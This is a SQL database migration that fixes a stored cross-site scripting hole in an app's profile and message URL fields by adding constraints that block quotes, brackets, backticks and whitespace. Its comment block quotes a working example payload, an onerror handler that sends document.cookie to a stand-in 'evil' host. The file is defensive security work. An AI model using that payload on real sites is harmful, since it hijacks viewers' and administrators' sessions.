-- CRITICAL: attribute-breakout stored XSS via photo_url/video_url/
-- certificate_file_url/attachment_url. armusSafeUrl() (i18n.js) used to
-- only check that a URL started with http(s):// before every page in the
-- app dropped it straight into an HTML attribute via a template literal
-- (src="${armusSafeUrl(...)}"). None of these columns are protected by
-- enforce_teacher_profile_lock or any other format check, and
-- armusUpdateOwnProfile/armusSendMessage have no field allowlist, so any
-- registered user could set e.g.
--   photo_url = 'https://x.com/a.jpg" onerror="fetch(`https://evil/c?`+document.cookie)'
-- directly via the Supabase client - a value that still starts with
-- "https://" so the old check let it through, then broke out of the
-- src="..." attribute the moment any page (admin.html reviewing a new
-- application, teacher.html/teachers.html's public listing, mesajlar.html
-- rendering a DM's image attachment, dashboard.html/my-lessons.html/
-- booking.html/student-dashboard.html's own avatar) rendered it -
-- executing arbitrary JS in that viewer's session, including an admin's.
--
-- armusSafeUrl() itself is fixed (i18n.js) to reject any URL containing
-- a quote/angle-bracket/backtick/whitespace character, closing the
-- client-side hole at its one shared source. This migration adds the
-- same rule as a database constraint, so a future write path that
-- forgets to go through armusSafeUrl can't reopen it.
--
-- NOT VALID + a separate VALIDATE: this is running against a live,
-- already-populated database, not a fresh install. A plain ADD
-- CONSTRAINT would check every existing row immediately and fail the
-- whole migration if even one already-stored value doesn't match (which
-- shouldn't happen - every real upload path only ever writes a clean,
-- generated Supabase Storage URL - but this migration's job is closing
-- the hole for every future write, not auditing history). NOT VALID
-- enforces the rule on every INSERT/UPDATE from the moment this runs,
-- while skipping that upfront historical check; VALIDATE CONSTRAINT
-- right after checks existing rows without holding the same lock a plain
-- ADD CONSTRAINT would, and surfaces a clear error naming the offending
-- row instead of the whole ALTER just failing.

alter table profiles add constraint profiles_photo_url_safe
  check (photo_url is null or (photo_url ~ '^https://' and photo_url !~ '[\s"''<>`]')) not valid;
alter table profiles validate constraint profiles_photo_url_safe;

alter table profiles add constraint profiles_video_url_safe
  check (video_url is null or (video_url ~ '^https://' and video_url !~ '[\s"''<>`]')) not valid;
alter table profiles validate constraint profiles_video_url_safe;

alter table profiles add constraint profiles_certificate_file_url_safe
  check (certificate_file_url is null or (certificate_file_url ~ '^https://' and certificate_file_url !~ '[\s"''<>`]')) not valid;
alter table profiles validate constraint profiles_certificate_file_url_safe;

alter table messages add constraint messages_attachment_url_safe
  check (attachment_url is null or (attachment_url ~ '^https://' and attachment_url !~ '[\s"''<>`]')) not valid;
alter table messages validate constraint messages_attachment_url_safe;
